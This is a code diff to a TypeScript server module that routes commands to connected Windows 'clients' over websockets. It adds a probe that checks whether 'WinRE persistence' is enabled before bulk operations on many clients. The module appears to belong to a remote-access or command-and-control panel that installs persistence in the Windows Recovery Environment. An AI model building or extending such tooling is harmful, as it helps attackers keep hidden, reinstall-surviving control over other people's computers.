@@ -20,10 +20,51 @@ type WinREUpload = {
   size: number;
 };
 
+type PendingCommandReply = {
+  resolve: (result: { ok: boolean; message?: string }) => void;
+  reject: (error: Error) => void;
+  timeout: NodeJS.Timeout;
+  clientId: string;
+};
+
 type WinRERouteDeps = {
   WINRE_ROOT: string;
   winreUploads: Map<string, WinREUpload>;
+  pendingCommandReplies: Map<string, PendingCommandReply>;
 };
+
+function isWindowsClient(target: any): boolean {
+  const clientOs = (target?.os || "").toLowerCase();
+  return clientOs.includes("windows");
+}
+
+async function probeWinRE(deps: WinRERouteDeps, target: any, clientId: string): Promise<{ ok: boolean; reason?: string; message?: string }> {
+  const cmdId = uuidv4();
+  const replyPromise: Promise<{ ok: boolean; message?: string }> = new Promise((resolve, reject) => {
+    const timeout = setTimeout(() => {
+      deps.pendingCommandReplies.delete(cmdId);
+      reject(new Error("WinRE support probe timed out"));
+    }, 15_000);
+    deps.pendingCommandReplies.set(cmdId, { resolve, reject, timeout, clientId });
+  });
+
+  target.ws.send(
+    encodeMessage({
+      type: "command",
+      commandType: "winre_probe",
+      id: cmdId,
+    }),
+  );
+
+  try {
+    const result = await replyPromise;
+    return result.ok
+      ? { ok: true }
+      : { ok: false, reason: "not_enabled", message: result.message || "WinRE persistence is not enabled on this client" };
+  } catch (error: any) {
+    return { ok: false, reason: "probe_failed", message: error.message || "WinRE support probe failed" };
+  }
+}
 
 export async function handleWinRERoutes(
   req: Request,
@@ -109,7 +150,7 @@ export async function handleWinRERoutes(
       return new Response("Not found", { status: 404 });
     }
 
-    const results: Array<{ clientId: string; ok: boolean; reason?: string }> = [];
+    const results: Array<{ clientId: string; ok: boolean; reason?: string; error?: string }> = [];
 
     for (const clientId of clientIds) {
       const target = clientManager.getClient(clientId);
@@ -118,9 +159,14 @@ export async function handleWinRERoutes(
         continue;
       }
 
-      const clientOs = (target.os || "").toLowerCase();
-      if (!clientOs.includes("windows")) {
+      if (!isWindowsClient(target)) {
         results.push({ clientId, ok: false, reason: "windows_only" });
+        continue;
+      }
+
+      const probe = await probeWinRE(deps, target, clientId);
+      if (!probe.ok) {
+        results.push({ clientId, ok: false, reason: probe.reason, error: probe.message });
         continue;
       }
 
@@ -195,7 +241,7 @@ export async function handleWinRERoutes(
       return new Response("Bad request", { status: 400 });
     }
 
-    const results: Array<{ clientId: string; ok: boolean; reason?: string }> = [];
+    const results: Array<{ clientId: string; ok: boolean; reason?: string; error?: string }> = [];
 
     for (const clientId of clientIds) {
       const target = clientManager.getClient(clientId);
@@ -204,9 +250,14 @@ export async function handleWinRERoutes(
         continue;
       }
 
-      const clientOs = (target.os || "").toLowerCase();
-      if (!clientOs.includes("windows")) {
+      if (!isWindowsClient(target)) {
         results.push({ clientId, ok: false, reason: "windows_only" });
+        continue;
+      }
+
+      const probe = await probeWinRE(deps, target, clientId);
+      if (!probe.ok) {
+        results.push({ clientId, ok: false, reason: probe.reason, error: probe.message });
         continue;
       }
 
@@ -261,7 +312,7 @@ export async function handleWinRERoutes(
       return new Response("Bad request", { status: 400 });
     }
 
-    const results: Array<{ clientId: string; ok: boolean; reason?: string }> = [];
+    const results: Array<{ clientId: string; ok: boolean; reason?: string; error?: string }> = [];
 
     for (const clientId of clientIds) {
       const target = clientManager.getClient(clientId);
@@ -270,9 +321,14 @@ export async function handleWinRERoutes(
         continue;
       }
 
-      const clientOs = (target.os || "").toLowerCase();
-      if (!clientOs.includes("windows")) {
+      if (!isWindowsClient(target)) {
         results.push({ clientId, ok: false, reason: "windows_only" });
+        continue;
+      }
+
+      const probe = await probeWinRE(deps, target, clientId);
+      if (!probe.ok) {
+        results.push({ clientId, ok: false, reason: probe.reason, error: probe.message });
         continue;
       }
 
